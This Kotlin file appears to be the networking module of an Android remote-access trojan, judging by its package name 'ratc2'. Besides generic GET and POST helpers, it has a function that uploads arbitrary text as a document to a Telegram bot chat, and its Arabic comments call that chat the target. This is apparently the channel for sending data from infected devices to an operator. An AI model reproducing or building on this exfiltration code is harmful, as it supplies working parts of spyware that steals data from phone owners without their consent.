package com.spud.ratc2

import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

object Sender {
    private const val TAG = "SENDER"

    fun get(url: String): String {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 15000
        c.readTimeout = 35000
        return c.inputStream.bufferedReader().readText()
    }

    fun post(url: String, params: String): String {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 15000
        c.readTimeout = 35000
        c.requestMethod = "POST"
        c.doOutput = true
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        c.outputStream.write(params.toByteArray())
        return c.inputStream.bufferedReader().readText()
    }

    /**
     * يرسل ملف نصي كمرفق في تيليجرام (multipart/form-data)
     * @param botBase https://api.telegram.org/bot<TOKEN>
     * @param chatId  محادثة الهدف
     * @param filename اسم الملف الظاهر في تيليجرام
     * @param content  محتوى الملف كنص UTF-8
     */
    fun sendDocument(botBase: String, chatId: String, filename: String, content: String): Boolean {
        return try {
            val boundary = "----SpudBoundary" + UUID.randomUUID().toString().replace("-", "")
            val url = URL("$botBase/sendDocument")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 20000
            conn.readTimeout = 60000
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val out: OutputStream = conn.outputStream
            val w = { s: String -> out.write(s.toByteArray(Charsets.UTF_8)) }

            // chat_id
            w("--$boundary\r\n")
            w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
            w("$chatId\r\n")

            // document
            w("--$boundary\r\n")
            w("Content-Disposition: form-data; name=\"document\"; filename=\"$filename\"\r\n")
            w("Content-Type: text/plain; charset=utf-8\r\n\r\n")
            w(content)
            w("\r\n")

            // نهاية
            w("--$boundary--\r\n")
            out.flush()
            out.close()

            val code = conn.responseCode
            Log.i(TAG, "sendDocument code=$code")
            code in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "sendDocument error", e)
            false
        }
    }

    fun readAll(input: java.io.InputStream): String =
        BufferedReader(InputStreamReader(input)).use { it.readText() }
}
